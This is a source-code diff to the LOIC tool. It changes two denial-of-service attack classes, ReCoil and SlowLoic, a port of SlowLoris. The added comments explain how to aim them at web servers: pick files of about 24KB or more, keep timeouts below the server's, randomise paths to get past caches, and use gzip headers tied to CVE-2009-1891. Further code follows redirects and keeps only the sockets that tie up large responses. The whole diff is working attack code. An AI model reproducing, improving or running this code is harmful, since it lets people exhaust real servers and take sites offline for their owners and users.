@@ -14,6 +14,8 @@ using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Net.Sockets;
+using System.Text;
+using System.Text.RegularExpressions;
 
 namespace LOIC
 {
@@ -21,15 +23,37 @@ namespace LOIC
     {
         public enum ReqState { Ready, Connecting, Requesting, Downloading, Completed, Failed };
         public ReqState State = ReqState.Ready;
-        
+
+        /// <summary>
+        /// Shows if all possible sockets are build. 
+        /// TRUE as long as the maximum amount of sockets is NOT reached.
+        /// </summary>
         public bool IsDelayed { get; set; } // don't spawn new threads until the last one reached the full capacity!!
 
+        /// <summary>
+        /// Amount of send requests.
+        /// </summary>
         public int Requested { get; set; }
+        /// <summary>
+        /// Amount of received responses / packets.
+        /// </summary>
         public int Downloaded { get; set; }
+        /// <summary>
+        /// Amount of failed packets / requests.
+        /// </summary>
         public int Failed { get; set; }
 
+        /// <summary>
+        /// set or get the current working state.
+        /// </summary>
         public bool IsFlooding { get; set; }
+        /// <summary>
+        /// the time in milliseconds between the creation of new sockets
+        /// </summary>
         public int Delay { get; set; }
+        /// <summary>
+        /// the timeout in seconds between requests for the same connection.
+        /// </summary>
         public int Timeout { get; set; }
 
         public virtual void start()
@@ -87,11 +111,24 @@ namespace LOIC
         private int _port;
         private string _subSite;
         private bool _random;
+        private bool _usegZip;
 
         private int _nSockets;
         private List<Socket> _lSockets  = new List<Socket>();
 
-        public ReCoil(string dns, string ip, int port, string subSite, int delay, int timeout, bool random, int nSockets)
+        /// <summary>
+        /// creates the ReCoil object. <.<
+        /// </summary>
+        /// <param name="dns">DNS string of the target</param>
+        /// <param name="ip">IP string of a specific server. Use this ONLY if the target does loadbalancing between different IPs and you want to target a specific IP. normally you want to provide an empty string!</param>
+        /// <param name="port">the Portnumber. however so far this class only understands HTTP.</param>
+        /// <param name="subsite">the path to the targeted site / document. (remember: the file has to be at least around 24KB!)</param>
+        /// <param name="delay">time in milliseconds between the creation of new sockets.</param>
+        /// <param name="timeout">time in seconds between request on the same connection. the higher the better .. but should be UNDER the timout from the server. (30 seemed to be working always so far!)</param>
+        /// <param name="random">adds a random string to the subsite so that every new connection requests a new file. (use on searchsites or to bypass the cache / proxy)</param>
+        /// <param name="nSockets">the amount of sockets for this object</param>
+        /// <param name="usegZip">turns on the gzip / deflate header to check for: CVE-2009-1891 - keep in mind, that the compressed file still has to be larger than ~24KB! (maybe use on large static files like pdf etc?)</param>
+        public ReCoil(string dns, string ip, int port, string subSite, int delay, int timeout, bool random, int nSockets, bool usegZip)
 		{
             this._dns = (dns == "") ? ip : dns; //hopefully they know what they are doing :)
 			this._ip = ip;
@@ -108,6 +145,7 @@ namespace LOIC
 			}
 			this.Delay = delay+1;
             this._random = random;
+            this._usegZip = usegZip;
             IsDelayed = true;
             Requested = 0; // we reset this! - meaning of this counter changes in this context!
  		}
@@ -127,25 +165,16 @@ namespace LOIC
             try
             {
                 int bsize = 16;
-                byte[] sbuf;
+                int mincl = 16384; // set minimal content-length to 16KB
+                byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}{3}{1}", _subSite, Environment.NewLine, _dns, ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
                 byte[] rbuf = new byte[bsize];
-                // header set-up
-                if (_random == true)
-                {
-                    sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Connection: keep-alive{2}{2}{2}", _subSite, new Functions().RandomString(), Environment.NewLine, _dns));
-                }
-                else
-                {
-                    sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Connection: keep-alive{1}{1}{1}", _subSite, Environment.NewLine, _dns));
-                }
-                // establishing the connection
-                //var host = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
                 State = ReqState.Ready;
                 var stop = DateTime.Now;
 
+                string redirect = "";
                 while (IsFlooding)
                 {
-                    stop = DateTime.Now.AddSeconds(Timeout);
+                    stop = DateTime.Now.AddMilliseconds(Timeout);
                     State = ReqState.Connecting; // SET STATE TO CONNECTING //
 
                     // we have to do this really slow 
@@ -157,6 +186,10 @@ namespace LOIC
                         try
                         {
                             socket.Connect(((_ip == "") ? _dns : _ip), _port);
+                            if (_random == true)
+                            {
+                                sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}{4}{2}", _subSite, new Functions().RandomString(), Environment.NewLine, _dns, ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
+                            }
                             socket.Send(sbuf);
                         }
                         catch
@@ -164,8 +197,71 @@ namespace LOIC
 
                         if (socket.Connected)
                         {
-                            _lSockets.Add(socket);
-                            Requested++;
+                            bool keeps = false;
+                            do
+                            { // some damn fail checks (and resolving dynamic redirects -.-)
+                                if (redirect != "")
+                                {
+                                    if (!socket.Connected)
+                                    {
+                                        socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                                        socket.Connect(((_ip == "") ? _dns : _ip), _port);
+                                    }
+                                    sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}{3}{1}", redirect, Environment.NewLine, _dns, ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
+                                    socket.Send(sbuf);
+                                    redirect = "";
+                                }
+                                keeps = false;
+                                try
+                                {
+                                    string header = "";
+                                    while (!header.Contains(Environment.NewLine + Environment.NewLine) && (socket.Receive(rbuf) >= bsize))
+                                    {
+                                        header += System.Text.Encoding.ASCII.GetString(rbuf);
+                                    }
+                                    string[] sp = header.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
+                                    string[] tsp;
+                                    for (int i = (sp.Length - 1); i >= 0; i--)
+                                    {
+                                        tsp = sp[i].Split(':');
+                                        if ((tsp[0] == "Content-Length") && (tsp.Length >= 2))
+                                        {
+                                            int sl = 0;
+                                            if (int.TryParse(tsp[1], out sl))
+                                            {
+                                                if (sl >= mincl)
+                                                {
+                                                    keeps = true;
+                                                    i = -1;
+                                                }
+                                            }
+                                        }
+                                        else if ((tsp[0] == "Transfer-Encoding") && (tsp.Length >= 2) && (tsp[1].ToLower().Trim() == "chunked"))
+                                        {
+                                            keeps = true; //well, what doo?
+                                            i = -1;
+                                        }
+                                        else if ((tsp[0] == "Location") && (tsp.Length >= 2))
+                                        {
+                                            redirect = tsp[1].Trim();
+                                            i = -1;
+                                        }
+                                    }
+                                }
+                                catch 
+                                {
+                                    ;
+                                }
+                            } while ((redirect != "") && (DateTime.Now < stop));
+
+                            if (keeps)
+                            {
+                                _lSockets.Add(socket);
+                                Requested++;
+                            }
+                            else
+                                Failed++;
+
                             if (_lSockets.Count < _nSockets)
                             {
                                 System.Threading.Thread.Sleep(Delay);
@@ -174,7 +270,7 @@ namespace LOIC
                         if (_lSockets.Count >= _nSockets)
                         {
                             IsDelayed = false;
-                            System.Threading.Thread.Sleep(Delay * 10);
+                            System.Threading.Thread.Sleep(Delay * 10); // just a precaution 
                         }
                     }
 
@@ -235,10 +331,11 @@ namespace LOIC
         }
 
         public override bool test()
-        { // do the scouting on your own!
+        { // do the scouting on your own! o__O
             return true;
         }
     } // class ReCoil
+
 
     /// <summary>
     /// SlowLoic is the port of RSnake's SlowLoris
@@ -257,6 +354,20 @@ namespace LOIC
         private int _nSockets;
         private List<Socket> _lSockets  = new List<Socket>();
 
+        /// <summary>
+        /// creates the SlowLoic / -Loris object. <.<
+        /// </summary>
+        /// <param name="dns">DNS string of the target</param>
+        /// <param name="ip">IP string of a specific server. Use this ONLY if the target does loadbalancing between different IPs and you want to target a specific IP. normally you want to provide an empty string!</param>
+        /// <param name="port">the Portnumber. however so far this class only understands HTTP.</param>
+        /// <param name="subsite">the path to the targeted site / document. (remember: the file has to be at least around 24KB!)</param>
+        /// <param name="delay">time in milliseconds between the creation of new sockets.</param>
+        /// <param name="timeout">time in seconds between a new partial header is sent on the same connection. the higher the better .. but should be UNDER the READ-timeout from the server. (30 seemed to be working always so far!)</param>
+        /// <param name="random">adds a random string to the subsite</param>
+        /// <param name="nSockets">the amount of sockets for this object</param>
+        /// <param name="randcmds">randomizes the sent header for every request on the same socket. (however all sockets send the same partial header during the same cyclus)</param>
+        /// <param name="useGet">if set to TRUE it uses the GET-command - due to the fact that http-Ready mitigates this change this to FALSE to use POST</param>
+        /// <param name="usegZip">turns on the gzip / deflate header to check for: CVE-2009-1891</param>
         public SlowLoic(string dns, string ip, int port, string subSite, int delay, int timeout, bool random, int nSockets, bool randcmds, bool useGet, bool usegZip)
 		{
             this._dns = (dns == "") ? ip : dns; //hopefully they know what they are doing :)
@@ -278,7 +389,7 @@ namespace LOIC
             this._useget = useGet;
             this._usegZip = usegZip;
             IsDelayed = true;
-            Requested = 0; // we reset this! - meaning of this counter chnges in this context!
+            Requested = 0; // we reset this! - meaning of this counter changes in this context!
  		}
 
 
@@ -295,14 +406,14 @@ namespace LOIC
             try
             {
                 // header set-up
-                byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{3} {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Connection: keep-alive{1}Content-Length: 42{1}{4}", _subSite, Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
+                byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{3} {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}Content-Length: 42{1}{4}", _subSite, Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
                 byte[] tbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("X-a: b{0}", Environment.NewLine));
                 State = ReqState.Ready;
                 var stop = DateTime.Now;
 
                 while (IsFlooding)
                 {
-                    stop = DateTime.Now.AddSeconds(Timeout);
+                    stop = DateTime.Now.AddMilliseconds(Timeout);
                     State = ReqState.Connecting; // SET STATE TO CONNECTING //
 
                     // we have to do this really slow 
@@ -310,7 +421,7 @@ namespace LOIC
                     {
                         if (_random == true)
                         {
-                            sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{4} {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Connection: keep-alive{2}Content-Length: 42{2}{5}", _subSite, new Functions().RandomString(), Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
+                            sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{4} {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}Content-Length: 42{2}{5}", _subSite, new Functions().RandomString(), Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
                         }
                         var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                         try
@@ -347,16 +458,18 @@ namespace LOIC
                             { 
                                 _lSockets.RemoveAt(i);
                                 Failed++;
+                                Requested--; // the "requested" number in the stats shows the actual open sockets
                             }
                             else
                             {
-                                Requested++; 
+                                Downloaded++; // this number is actually BS .. but we wanna see sth happen :D
                             }
                         }
                         catch
                         {
                             _lSockets.RemoveAt(i);
                             Failed++;
+                            Requested--;
                         }
                     }
 
@@ -395,7 +508,5 @@ namespace LOIC
         }
 
     } // class SlowLoic
-
-
-
+    
 }
